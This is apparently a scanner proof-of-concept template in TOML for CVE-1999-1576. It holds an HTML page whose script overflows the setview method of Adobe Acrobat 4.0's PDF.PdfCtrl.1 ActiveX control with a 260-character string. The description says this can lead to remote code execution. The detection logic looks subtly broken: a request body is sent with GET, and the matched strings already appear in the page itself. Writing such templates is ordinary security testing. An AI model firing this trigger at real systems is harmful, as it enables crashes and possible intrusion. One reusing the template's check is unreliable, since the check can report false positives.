[info]
author = "ave"
description = "检测 Adobe Acrobat Reader 4.0 的 ActiveX 控件 pdf.ocx (PDF.PdfCtrl.1) 1.3.188 版本中的缓冲区溢出漏洞。通过构造包含超长参数的恶意 HTML 页面，调用 pdf.setview 方法触发缓冲区溢出，可导致远程代码执行。该漏洞源于对 setview 方法输入参数长度未做校验。"
id = "POC-AVE-1999-2008"
name = "Adobe Acrobat ActiveX PDF.PdfCtrl.1 setview Buffer Overflow PoC"
severity = "high"
tags = [
    "cve-1999-1576",
    "activex",
    "buffer-overflow",
    "adobe",
    "acrobat",
]
vuln_id = [
    "CVE-1999-1576",
    "AVE-1999-2008",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/poc.html"
protocol = "http"

[poc.requests.body]
content = """
<html>
<head>
<script>
function trigger() {
  try {
    var pdf = new ActiveXObject("PDF.PdfCtrl.1");
    var buf = "A";
    while (buf.length < 260) buf += "A";
    pdf.setview(buf);
    return true;
  } catch(e) {
    return false;
  }
}
</script>
</head>
<body onload="document.getElementById('result').innerHTML = trigger() ? 'VULNERABLE' : 'NOT_VULN';">
<div id="result">checking</div>
</body>
</html>
"""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["VULNERABLE"]

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["PDF.PdfCtrl"]
